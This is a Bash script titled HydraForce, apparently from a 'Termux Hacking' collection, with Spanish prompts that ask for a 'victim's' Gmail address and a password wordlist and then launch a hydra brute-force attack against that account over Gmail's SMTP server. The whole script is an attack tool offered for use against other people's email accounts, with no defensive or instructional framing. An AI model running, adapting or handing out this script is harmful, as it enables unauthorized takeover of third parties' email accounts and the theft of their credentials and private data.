#!/bin/bash
#
# Created by: Termux Hacking
#
# HydraForce
#
# VARIABLES
#
PWD=$(pwd)
source $PWD/Colors.sh
#
# FUNCIONES
#
function HydraFB {
	sleep 0.5
	clear
echo -e "${verde}
 ▄▄    ▄▄                  ▄▄                      ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄
 ██    ██                  ██                      ██▀▀▀▀▀▀  ██▀▀▀▀██
 ██    ██  ▀██  ███   ▄███▄██   ██▄████   ▄█████▄  ██        ██    ██
 ████████   ██▄ ██   ██▀  ▀██   ██▀       ▀ ▄▄▄██  ███████   ███████
 ██    ██    ████▀   ██    ██   ██       ▄██▀▀▀██  ██        ██    ██
 ██    ██     ███    ▀██▄▄███   ██       ██▄▄▄███  ██        ██▄▄▄▄██
 ▀▀    ▀▀     ██       ▀▀▀ ▀▀   ▀▀        ▀▀▀▀ ▀▀  ▀▀        ▀▀▀▀▀▀▀
            ███
"${blanco}
}
function Menu_FB {
echo -e -n "${verde}
┌═════════════════════════════════════════┐
█ ${blanco}INGRESE EL CORREO DE SU VÍCTIMA ${rojo}(Gmail) ${verde}█
└═════════════════════════════════════════┘
┃    ┌═══════════════════════════════════════┐
└═>>>█ EJEMPLO => ${blanco}termuxhacking000@gmail.com ${verde}█
┃    └═══════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r correo
sleep 0.5
echo -e -n "${verde}
┌════════════════════════════════════════════┐
█ ${blanco}INGRESE LA RUTA Y NOMBRE DE SU DICCIONARIO ${verde}█
└════════════════════════════════════════════┘
┃    ┌══════════════════════════════════════┐
└═>>>█ EJEMPLO => ${blanco}/sdcard/Download/Pass.txt ${verde}█
┃    └══════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r ruta
sleep 0.5
echo -e "${verde}
┌═════════════════════════════════════┐
█ ${blanco}INICIANDO ATAQUE DE FUERZA BRUTA... ${verde}█
└═════════════════════════════════════┘
"${blanco}
sleep 1
hydra -S -l $correo -P $ruta -s -ns -V -s 465 smtp.gmail.com smtp
}
#
# CÓDIGO
#
HydraFB
Menu_FB
